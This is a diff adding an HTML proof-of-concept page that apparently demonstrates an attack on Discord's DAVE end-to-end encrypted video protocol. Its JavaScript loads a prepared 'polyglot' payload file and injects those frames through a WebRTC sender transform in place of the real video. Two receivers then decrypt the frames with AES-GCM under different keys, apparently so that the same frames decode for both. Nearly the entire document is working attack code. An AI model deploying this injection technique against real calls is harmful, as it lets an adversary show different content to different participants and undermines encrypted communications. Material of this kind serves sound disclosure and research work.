@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord DAVE Protocol PoC</title>
+    <style>
+        body { font-family: sans-serif; background-color: #1e1e1e; color: #fff; padding: 20px; }
+        .video-container { display: flex; gap: 20px; margin-top: 20px; }
+        .box { background: #333; padding: 10px; border-radius: 8px; text-align: center; }
+        video, canvas { background: #000; border: 1px solid #555; width: 320px; height: 240px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; margin-bottom: 20px;}
+        button:hover { background: #0056b3; }
+        #log { margin-top: 20px; padding: 10px; background: #222; border: 1px solid #444; height: 240px; overflow-y: scroll; font-family: monospace; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h2>Discord DAVE Protocol PoC</h2>
+    <button id="startBtn">Start DAVE Session & Inject Payload</button>
+
+    <div class="video-container">
+        <div class="box">
+            <h3>Sender (Adversary)</h3>
+            <canvas id="AdversaryCanvas"></canvas>
+        </div>
+        <div class="box">
+            <h3>Receiver A (Key old)</h3>
+            <video id="videoA" autoplay playsinline muted></video>
+        </div>
+        <div class="box">
+            <h3>Receiver B (Key new)</h3>
+            <video id="videoB" autoplay playsinline muted></video>
+        </div>
+    </div>
+
+    <div id="log"></div>
+
+    <script>
+        const MIN_WARMUP_MS = 2000;
+        const MAX_WARMUP_MS = 6000;
+
+        function log(msg) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function decodeUleb128(data, offset) {
+            let result = 0, shift = 0, currentOffset = offset;
+            while (true) {
+                let byte = data[currentOffset++];
+                result |= (byte & 0x7F) << shift;
+                if ((byte & 0x80) === 0) break;
+                shift += 7;
+            }
+            return { value: result, nextOffset: currentOffset };
+        }
+
+        function decodeRanges(data, offset) {
+            let { value: count, nextOffset } = decodeUleb128(data, offset);
+            let ranges = [];
+            for (let i = 0; i < count; i++) {
+                let offsetRes = decodeUleb128(data, nextOffset);
+                let lengthRes = decodeUleb128(data, offsetRes.nextOffset);
+                ranges.push({ offset: offsetRes.value, length: lengthRes.value });
+                nextOffset = lengthRes.nextOffset;
+            }
+            return { ranges, nextOffset };
+        }
+
+        function extractCiphertext(data, ranges, footerStart) {
+            ranges.sort((a, b) => a.offset - b.offset);
+            let encLen = footerStart - ranges.reduce((sum, r) => sum + r.length, 0);
+            let ciphertext = new Uint8Array(encLen);
+            let cIdx = 0, dataIdx = 0;
+
+            for (let r of ranges) {
+                let chunkLen = r.offset - dataIdx;
+                if (chunkLen > 0) {
+                    ciphertext.set(data.slice(dataIdx, dataIdx + chunkLen), cIdx);
+                    cIdx += chunkLen;
+                }
+                dataIdx = r.offset + r.length;
+            }
+            if (dataIdx < footerStart) {
+                ciphertext.set(data.slice(dataIdx, footerStart), cIdx);
+            }
+            return ciphertext;
+        }
+
+        function reconstructFrame(plaintext, originalData, ranges) {
+            ranges.sort((a, b) => a.offset - b.offset);
+            let totalLen = plaintext.length + ranges.reduce((sum, r) => sum + r.length, 0);
+            let reconstructed = new Uint8Array(totalLen);
+            let pIdx = 0, dataIdx = 0;
+
+            for (let r of ranges) {
+                let chunkLen = r.offset - dataIdx;
+                if (chunkLen > 0) {
+                    reconstructed.set(plaintext.slice(pIdx, pIdx + chunkLen), dataIdx);
+                    pIdx += chunkLen;
+                    dataIdx += chunkLen;
+                }
+                reconstructed.set(originalData.slice(r.offset, r.offset + r.length), dataIdx);
+                dataIdx += r.length;
+            }
+            if (pIdx < plaintext.length) {
+                reconstructed.set(plaintext.slice(pIdx), dataIdx);
+            }
+            return reconstructed;
+        }
+
+        function hexToBytes(hex) {
+            let bytes = new Uint8Array(hex.length / 2);
+            for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+            return bytes;
+        }
+
+        const KEY1 = hexToBytes("e8a17b3d9c4f2a5e6b8d1c0f3a2e5d4b");
+        const KEY2 = hexToBytes("1f2e3d4c5b6a798897a6b5c4d3e2f100");
+
+        async function setupDaveReceiverTransform(receiver, keyBytes, receiverId) {
+            const receiverStreams = receiver.createEncodedStreams();
+            const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, "AES-GCM", false, ["decrypt"]);
+
+            let okCount = 0, failCount = 0;
+
+            const transformStream = new TransformStream({
+                async transform(encodedFrame, controller) {
+                    const data = new Uint8Array(encodedFrame.data);
+                    const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
+
+                    if (data.length < 2 || view.getUint16(data.length - 2) !== 0xFAFA) {
+                        controller.enqueue(encodedFrame); return;
+                    }
+
+                    try {
+                        const suppSize = data[data.length - 3];
+                        const footerStart = data.length - 3 - suppSize;
+                        const footerData = data.slice(footerStart, data.length - 3);
+
+                        const tag8 = footerData.slice(0, 8);
+
+                        let { value: nonceUint32, nextOffset: nonceEnd } = decodeUleb128(footerData, 8);
+
+                        const nonce = new Uint8Array(12);
+                        new DataView(nonce.buffer).setUint32(8, nonceUint32);
+
+                        let { ranges } = decodeRanges(footerData, nonceEnd);
+
+                        let dynamicAAD = new Uint8Array(0);
+                        ranges.forEach(r => {
+                            const part = data.slice(r.offset, r.offset + r.length);
+                            let newAAD = new Uint8Array(dynamicAAD.length + part.length);
+                            newAAD.set(dynamicAAD); newAAD.set(part, dynamicAAD.length);
+                            dynamicAAD = newAAD;
+                        });
+
+                        const ciphertext = extractCiphertext(data, ranges, footerStart);
+
+                        const ciphertextWithTag = new Uint8Array(ciphertext.length + 8);
+                        ciphertextWithTag.set(ciphertext);
+                        ciphertextWithTag.set(tag8, ciphertext.length);
+
+                        const decryptedBuf = await crypto.subtle.decrypt(
+                            { name: "AES-GCM", iv: nonce, additionalData: dynamicAAD, tagLength: 64 },
+                            cryptoKey, ciphertextWithTag
+                        );
+
+                        encodedFrame.data = reconstructFrame(new Uint8Array(decryptedBuf), data, ranges).buffer;
+                        controller.enqueue(encodedFrame);
+
+                        okCount++;
+                        if (okCount === 1) log(`[${receiverId}] First frame decrypted successfully.`);
+                        if (okCount % 120 === 0) log(`[${receiverId}] decoded=${okCount} fail=${failCount}`);
+
+                    } catch (e) {
+                        failCount++;
+                        if (failCount <= 3 || failCount % 60 === 0) {
+                            log(`[${receiverId}] Decryption failed (#${failCount}): ${e.message}`);
+                        }
+                    }
+                }
+            });
+            receiverStreams.readable.pipeThrough(transformStream).pipeTo(receiverStreams.writable);
+        }
+
+        let polyglotFrames = [];
+        let AdversaryStream;
+
+        async function loadPolyglotFile() {
+            log("Loading DAVE compliant payload...");
+            const response = await fetch('webrtc_polyglot_dave.bin');
+            const data = new Uint8Array(await response.arrayBuffer());
+
+            let offset = 0;
+            while (offset < data.length) {
+                const view = new DataView(data.buffer, data.byteOffset + offset, data.byteLength - offset);
+                if (view.byteLength < 4) break;
+
+                const frameLen = view.getUint32(0);
+                offset += 4;
+                polyglotFrames.push(data.slice(offset, offset + frameLen));
+                offset += frameLen;
+            }
+            log(`Parsed ${polyglotFrames.length} DAVE frames.`);
+        }
+
+        function setupSenderTransform(sender, receiverId) {
+            const senderStreams = sender.createEncodedStreams();
+            const startTime = Date.now();
+            let frameIndex = 0;
+            let started = false;
+
+            const transformStream = new TransformStream({
+                transform(encodedFrame, controller) {
+                    if (polyglotFrames.length === 0) {
+                        controller.enqueue(encodedFrame); return;
+                    }
+
+                    if (!started) {
+                        const elapsed = Date.now() - startTime;
+                        const isCodecKey = encodedFrame.type === 'key';
+                        if ((elapsed >= MIN_WARMUP_MS && isCodecKey) || elapsed >= MAX_WARMUP_MS) {
+                            started = true;
+                            log(`[${receiverId}] Starting polyglot at ${elapsed}ms (codec-key=${isCodecKey}).`);
+                        } else {
+                            controller.enqueue(encodedFrame);
+                            return;
+                        }
+                    }
+
+                    if (frameIndex >= polyglotFrames.length) {
+                        controller.enqueue(encodedFrame); return;
+                    }
+
+                    const payload = polyglotFrames[frameIndex++];
+                    encodedFrame.data = new Uint8Array(payload).buffer;
+                    controller.enqueue(encodedFrame);
+
+                    if (frameIndex === polyglotFrames.length) {
+                        log(`[${receiverId}] Polyglot injection complete (${frameIndex} frames).`);
+                    }
+                }
+            });
+            senderStreams.readable.pipeThrough(transformStream).pipeTo(senderStreams.writable);
+        }
+
+        async function startWebRTC(receiverId, keyBytes) {
+            log(`[${receiverId}] Starting WebRTC setup...`);
+            try {
+                const senderPeer = new RTCPeerConnection();
+                const receiverPeer = new RTCPeerConnection();
+
+                senderPeer.onicecandidate = e => {
+                    if(e.candidate) receiverPeer.addIceCandidate(e.candidate);
+                };
+                receiverPeer.onicecandidate = e => {
+                    if(e.candidate) senderPeer.addIceCandidate(e.candidate);
+                };
+
+                senderPeer.oniceconnectionstatechange = () => {
+                    const s = senderPeer.iceConnectionState;
+                    if (s === 'connected' || s === 'completed') {
+                        log(`[${receiverId}] ICE ${s}.`);
+                    }
+                };
+
+                receiverPeer.ontrack = e => {
+                    log(`[${receiverId}] Video track received. Connecting to decoder...`);
+                    document.getElementById(receiverId).srcObject = new MediaStream([e.track]);
+                    setupDaveReceiverTransform(e.receiver, keyBytes, receiverId);
+                };
+
+                log(`[${receiverId}] Adding sender track...`);
+                const sender = senderPeer.addTrack(AdversaryStream.getVideoTracks()[0], AdversaryStream);
+                setupSenderTransform(sender, receiverId);
+
+                const capabilities = RTCRtpReceiver.getCapabilities('video');
+                const h265Codecs = capabilities.codecs.filter(c =>
+                    c.mimeType.toLowerCase() === 'video/h265' || c.mimeType.toLowerCase() === 'video/hevc'
+                );
+                if (h265Codecs.length > 0) {
+                    senderPeer.getTransceivers()[0].setCodecPreferences(h265Codecs);
+                    log(`[${receiverId}] Enforced H.265 codec.`);
+                } else {
+                    log(`[${receiverId}] Warning: H.265 not supported in this browser.`);
+                }
+
+                log(`[${receiverId}] Creating Offer...`);
+                const offer = await senderPeer.createOffer();
+                await senderPeer.setLocalDescription(offer);
+                await receiverPeer.setRemoteDescription(offer);
+
+                log(`[${receiverId}] Creating Answer...`);
+                const answer = await receiverPeer.createAnswer();
+                await receiverPeer.setLocalDescription(answer);
+                await senderPeer.setRemoteDescription(answer);
+
+                log(`[${receiverId}] DAVE Connection established.`);
+            } catch (err) {
+                log(`[${receiverId}] WebRTC Connection Error: ${err.message}`);
+                console.error(err);
+            }
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            try {
+                document.getElementById('startBtn').disabled = true;
+                log("--- DAVE Session Started ---");
+
+                await loadPolyglotFile();
+
+                log("Starting Adversary Canvas stream...");
+                const canvas = document.getElementById('AdversaryCanvas');
+                const ctx2d = canvas.getContext('2d');
+
+                let frameCount = 0;
+                setInterval(() => {
+                    ctx2d.fillStyle = '#111';
+                    ctx2d.fillRect(0,0,320,240);
+                    ctx2d.fillStyle = '#0f0';
+                    ctx2d.font = '16px monospace';
+                    ctx2d.fillText(`DAVE Adversary Sending...`, 20, 100);
+                    ctx2d.fillText(`Frame: ${frameCount++}`, 20, 130);
+                }, 1000 / 30);
+
+                AdversaryStream = canvas.captureStream(30);
+                log("Adversary stream captured. Initializing peer connections.");
+
+                await startWebRTC('videoA', KEY1);
+                await startWebRTC('videoB', KEY2);
+
+            } catch (err) {
+                log(`Main Process Error: ${err.message}`);
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
